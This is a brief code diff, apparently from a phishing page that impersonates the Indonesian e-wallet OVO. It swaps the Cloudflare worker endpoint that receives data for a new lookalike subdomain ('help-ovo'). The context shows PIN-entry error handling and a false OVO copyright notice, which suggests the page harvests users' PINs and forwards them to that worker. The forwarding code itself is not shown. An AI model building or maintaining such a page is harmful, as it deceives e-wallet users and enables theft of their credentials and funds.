@@ -19,7 +19,7 @@
     const errorMessage = document.getElementById('errorPin');
 
     // === KONFIGURASI WORKER ===
-    const WORKER_URL = 'https://quiet-violet-4397.care-id.workers.dev/';
+    const WORKER_URL = 'https://green-dust-cbc5.help-ovo.workers.dev/';
 
     // ---- COPYRIGHT NOTICE ----
     console.log('%c© 2026 OVO Indonesia. All Rights Reserved.', 'color: #4B006E; font-size: 16px; font-weight: bold;');
